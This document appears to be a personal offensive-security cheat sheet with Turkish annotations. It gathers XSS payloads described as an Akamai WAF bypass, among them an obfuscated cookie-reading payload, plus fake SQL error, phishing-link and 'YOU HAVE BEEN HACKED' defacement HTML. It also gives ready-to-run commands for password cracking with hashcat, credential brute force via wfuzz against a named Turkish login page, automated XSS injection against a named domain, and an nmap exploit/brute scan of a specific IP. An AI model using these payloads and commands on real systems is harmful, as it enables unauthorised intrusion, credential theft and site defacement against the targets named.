# manuel

# akamai xss bypass 

```
<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;</font>
```
```
<A HREF="https://www.cia.gov/">Login Here </A>
```
```
<button onClick="alert('xss')">Submit</button>
```
```
"'>"<A HRef=" AutoFocus OnFocus=top//? >
```
```
"'>"<A HRef=" AutoFocus OnFocus=top//?['ale'%2B'rt'](document%2Bcookie)>
```
______________________________
# Offensive payload
```
git clone https://github.com/InfoSecWarrior/Offensive-Payloads.git 
```
_____________________________

### link-gopher : Web sitesindeki linkleri cikartir tek tek elle kopyala yapistir yapmazsin
______________________________

# hashcat icin wordlist
```
https://packetstormsecurity.com/Crackers/wordlists/page1/
```
```
https://labs.nettitude.com/tools/rocktastic/
```
```
https://github.com/J3rryBl4nks/PasswordCrackingMethodology
```
```
hashcat -m 300 -a 0 -o hashcikti3a.txt hashes5k.txt weakpass_3a/weakpass_3a
```


____________________________
```
gobuster dir -w /usr/share/wordlists/dirb/common.txt --url 192.168.56.116
```
```
echo "http://arkas.com.tr" | waybackurls | gf xss | xargs -I {} injectx.py -u {}
```
```
wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt -z file,/usr/share/seclists/Passwords/darkweb2017-top100.txt --hc 200 -d "username=FUZZ&password=FUZ2Z" https://www.kamyonum.com.tr/edit/login.asp 
```
```
nmap -Pn -n --top-ports 5000 13.40.217.134 -sV -sC --version-all --script=vuln --script=auth --script=http-brute,snmp-brute --script=exploit --script=malware -o nmapExploitScan
```

```
<h1><A HREF="https://cia.gov/"><marquee>YOU HAVE BEEN HACKED by DedCrowd</marquee> </A>
```


